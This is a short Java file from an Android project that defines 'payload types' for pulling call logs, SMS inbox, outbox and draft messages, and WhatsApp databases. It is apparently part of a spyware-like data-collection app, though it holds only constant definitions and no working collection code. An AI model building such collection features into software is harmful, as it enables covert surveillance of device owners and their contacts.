package com.aigs.serviceone.helpers;

import androidx.annotation.IntDef;

import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;

@Retention(RetentionPolicy.RUNTIME)
@IntDef({PayloadTypes.GET_CALL_LOGS,
        PayloadTypes.GET_TEXT_MESSAGES_INBOX,
        PayloadTypes.GET_TEXT_MESSAGES_DRAFT,
        PayloadTypes.GET_TEXT_MESSAGES_OUTBOX,
        PayloadTypes.GET_WHATSAPP_DATABASES})

public @interface PayloadTypes {
    int GET_CALL_LOGS = 0;
    int GET_TEXT_MESSAGES_INBOX = 1;
    int GET_TEXT_MESSAGES_OUTBOX = 2;
    int GET_TEXT_MESSAGES_DRAFT = 3;
    int GET_WHATSAPP_DATABASES = 4;
}
